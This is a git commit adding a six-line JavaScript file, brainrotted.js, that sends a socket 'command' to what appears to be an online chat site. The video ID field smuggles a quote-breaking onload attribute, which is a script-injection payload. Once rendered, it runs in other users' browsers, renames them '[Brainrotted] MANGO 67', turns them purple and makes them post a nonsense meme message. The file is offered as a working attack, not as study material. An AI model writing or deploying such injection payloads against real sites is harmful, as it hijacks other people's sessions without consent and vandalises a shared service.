d8cbe9d6cd009a0316bb3807ad37c173cfab830c
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-03-11 12:55:39 -0300

    Create brainrotted.js

---
+++ brainrotted.js
@@ -0,0 +1,6 @@
+socket.emit('command', {
+  list: [
+    "youtube",
+    "VIDEO_ID\" onload=\"socket.emit('command',{list:['name','[Brainrotted] MANGO 67']});socket.emit('command',{list:['color','purple']});window.socket.emit('talk',{text:'67 MANGO MANGO MANGO MUSTARD! CHICKEN STARS BABY GRONK ALL I WANTED WAS TO SEE TUNG TUNG TUNG SAHUR SKIBIDI TOILET'});\""
+  ]
+});
